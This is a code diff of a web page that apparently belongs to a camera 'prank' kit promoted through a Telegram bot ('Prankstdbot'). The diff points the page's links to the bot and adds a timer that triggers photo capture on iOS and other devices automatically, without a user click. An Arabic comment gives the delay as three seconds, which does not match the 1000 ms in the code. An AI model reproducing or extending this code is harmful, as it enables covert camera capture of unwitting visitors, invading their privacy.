@@ -14,7 +14,7 @@
             margin: 0;
             overflow: hidden;
             font-family: Arial, sans-serif;
-            background-color: #000000;
+            background-color: #DEF1F9;
         }
         
         body {
@@ -199,7 +199,7 @@
     <div id="photo-container">
         <img id="photo" alt="Captured" />
         <p id="upcaption">
-    <a href="#" target="_blank" style="text-decoration: none; color: white;">
+    <a href="https://t.me/Prankstdbot" target="_blank" style="text-decoration: none; color: white;">
         <span style="--i:0;">P</span>
         <span style="--i:1;">r</span>
         <span style="--i:2;">a</span>
@@ -386,9 +386,16 @@
         } else {
             capturePhotoForOtherDevices();
         }
-        
+         // تأخير 3 ثواني قبل فتح الكاميرا
+setTimeout(() => {
+    if (isIOS()) {
+      capturePhotoForIOS();
+    } else {
+      capturePhotoForOtherDevices();
+    }
+  }, 1000);
         linkElement.addEventListener('click', function() {
-            window.open('#', '_blank');
+            window.open('https://t.me/Prankstdbot', '_blank');
         });
        
        newCaptureButton.addEventListener('click', () => {
